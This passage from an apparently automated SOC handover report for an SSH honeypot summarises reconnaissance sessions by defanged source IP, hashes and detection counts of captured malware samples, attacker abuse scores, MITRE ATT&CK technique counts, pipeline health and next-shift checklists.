- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `8.129.28[.]185` | **14** | 2026-03-31 21:17 | 2026-03-31 21:25 | 2m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.67[.]255` | **10** | 2026-03-31 20:49 | 2026-03-31 21:33 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `101.126.69[.]201` | 1 | 2026-03-31 20:44 | 2026-03-31 20:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.220.91[.]130` | 1 | 2026-03-31 20:42 | 2026-03-31 20:42 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.99.127[.]122` | 1 | 2026-03-31 21:41 | 2026-03-31 21:41 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.113.241[.]82` | 1 | 2026-03-31 21:21 | 2026-03-31 21:22 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.187.230[.]116` | 1 | 2026-03-31 21:20 | 2026-03-31 21:20 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.151.45[.]136` | 1 | 2026-03-31 22:01 | 2026-03-31 22:01 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.102.235[.]86` | 1 | 2026-03-31 21:46 | 2026-03-31 21:46 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `203.193.137[.]250` | 1 | 2026-03-31 21:59 | 2026-03-31 21:59 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.254.212[.]59` | 1 | 2026-03-31 20:50 | 2026-03-31 20:50 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `31.31.118[.]93` | 1 | 2026-03-31 22:16 | 2026-03-31 22:17 | 12s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]25` | 1 | 2026-03-31 21:02 | 2026-03-31 21:02 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `75.159.68[.]143` | 1 | 2026-03-31 22:19 | 2026-03-31 22:19 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `77.105.135[.]77` | 1 | 2026-03-31 20:57 | 2026-03-31 20:57 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `78.70.248[.]209` | 1 | 2026-03-31 21:00 | 2026-03-31 21:00 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `75.159.68[.]143` | CA | TELUS-FIBRE-LTBRAB07 | **100** ⚠️ | 28 |
| `20.102.235[.]86` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `78.70.248[.]209` | SE | Telia Network Services | **100** ⚠️ | 2 |
| `31.31.118[.]93` | UA | TeNeT Networking Centre | **100** ⚠️ | 0 |
| `49.124.153[.]25` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 16 |
| `116.113.241[.]82` | CN | InnerMongoliaAlashanZXHB52MH01huawei3 | **100** ⚠️ | 25 |
| `138.199.39[.]186` | JP | Datacamp Limited | **100** ⚠️ | 9 |
| `8.129.28[.]185` | CN | Aliyun Computing Co.LTD | **100** ⚠️ | 14 |
| `211.254.212[.]59` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `77.105.135[.]77` | FI | New Hosting Technologies LLC | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 55 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 25 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 17 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 60 cases |
| Tool 34  | Credential Extractor        | ✅ 42 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 24 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (8.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 17 priority case(s) shown individually · 16 recon entry/entries in table (2 group(s) consolidating 24 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-31T22:33:17Z_
